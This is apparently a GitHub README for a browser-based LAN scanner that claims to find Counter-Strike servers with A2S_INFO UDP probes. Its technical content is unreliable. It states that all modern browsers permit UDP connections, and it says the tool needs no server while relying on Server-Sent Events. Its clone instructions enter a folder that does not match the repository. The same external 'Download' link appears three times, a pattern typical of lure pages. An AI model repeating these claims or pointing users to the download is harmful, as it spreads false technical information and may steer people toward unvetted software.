# CS Radar v1.0 – LAN Scanner 2026

> **A browser-driven LAN scanner that actively probes your local network for Counter-Strike servers via A2S_INFO queries, streaming live results through Server-Sent Events.** This tool enables gamers and server admins to quickly locate every active Counter-Strike game server on their local subnet without resorting to manual port sweeps.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/matt-lewis65/cs-radar-v1?style=flat-square)](https://github.com/matt-lewis65/cs-radar-v1)

---

<p align="center">
  <a href="https://matt-lewis65.github.io/cs-radar-v1/">
    <img src="https://img.shields.io/badge/Download-CS%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download CS Radar">
  </a>
</p>

> **[Direct Download – CS Radar v1.0](https://matt-lewis65.github.io/cs-radar-v1/)**

---

[Download Latest Build](https://matt-lewis65.github.io/cs-radar-v1/)

---

## Overview

CS Radar turns your web browser into a specialized network discovery tool built for Counter-Strike server detection. Rather than depending on static server lists or manual IP checks, this scanner sends active UDP probes across your local subnet and parses the A2S_INFO responses to pinpoint running game servers. The result is a live, continuously updated view of every Counter-Strike instance on your network, complete with details such as player counts, current map, and game version.

This tool is ideal for LAN party organizers, competitive players, and network administrators who need to locate game servers quickly without third-party software. The retro terminal look combined with an animated radar favicon gives it a distinct personality while staying fully functional. CS Radar manages scan concurrency intelligently to avoid saturating the network while still returning results rapidly.

---

## Capabilities

- **Active UDP Probing** – Sends A2S_INFO requests across your local subnet to discover Counter-Strike servers
- **Instant SSE Updates** – Server-Sent Events push results to the UI as soon as servers are found
- **Automatic Version Identification** – Detects which Counter-Strike version each server is running
- **On-Demand IP Query** – Check a specific IP address for server information at any time
- **Controlled Concurrency** – Adjustable scan speed prevents network congestion
- **Server Detail Display** – Shows player counts, map name, hostname, and game type
- **One-Click Connect Copy** – Quickly copy server connection strings to your clipboard
- **Animated Radar Favicon** – Provides visual feedback in the browser tab during scans
- **Retro Terminal Interface** – Classic green-on-black aesthetic with a functional layout

---

## Setup

CS Radar is a client-side web application with no build step required.

```bash
git clone https://github.com/matt-lewis65/cs-radar-v1.git
cd CSRadar-LAN-Scanner
```

Open `index.html` in any modern web browser. No server or external dependencies are needed.

---

## How to Use

1. **Begin Scanning** – Click the "Scan" button to start probing your local network
2. **Watch Results** – Servers appear in real time with full details as they are discovered
3. **Filter the List** – Use the search bar to narrow down servers by name or IP
4. **Connect to a Server** – Click the copy icon next to any server to grab its connection string
5. **Manual Lookup** – Enter an IP address in the manual query field for targeted checks

Typical workflow:
- Open CS Radar in your browser
- Press "Scan" to initiate network discovery
- Wait for results to appear (usually 5–30 seconds depending on network size)
- Click a server to view its detailed information
- Use "Copy to Connect" to paste the address into your game client

---

## Configuration

All settings are persisted in your browser's local storage across sessions. Adjust these parameters from the settings panel:

- **Scan Range** – Define the IP range to scan (default: your local subnet)
- **Concurrency Level** – Number of simultaneous probes (1–50, default: 10)
- **Timeout** – Milliseconds to wait for server responses (default: 2000ms)
- **Port Range** – UDP ports to check (default: 27015–27020)

---

## System Requirements

- **Platform** – Any modern web browser (Chrome, Firefox, Edge, Safari)
- **Runtime** – No server required; runs entirely on the client side
- **Network** – Local network access for UDP scanning
- **Storage** – Minimal; settings stored in browser local storage
- **Permissions** – Browser must allow UDP connections (supported in all modern browsers)

---

## Frequently Asked Questions

**Q: Can CS Radar scan external networks?**
A: No. It is purpose-built for local network scanning and will not probe external IPs or the internet.

**Q: Does it work with games other than Counter-Strike?**
A: The tool is optimized for Counter-Strike's A2S_INFO protocol, but it may detect other Source-engine servers on the same network.

**Q: How do I update to a newer version?**
A: Download the latest release from the repository and replace your existing files. No data migration is necessary.

**Q: Why aren't some servers appearing?**
A: Make sure the servers are running and your firewall allows UDP traffic on the scanned ports. Some routers may block multicast discovery.

**Q: Is there a command-line version available?**
A: Currently CS Radar is browser-only, but the scanning logic could be adapted for CLI use in a future release.

---

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
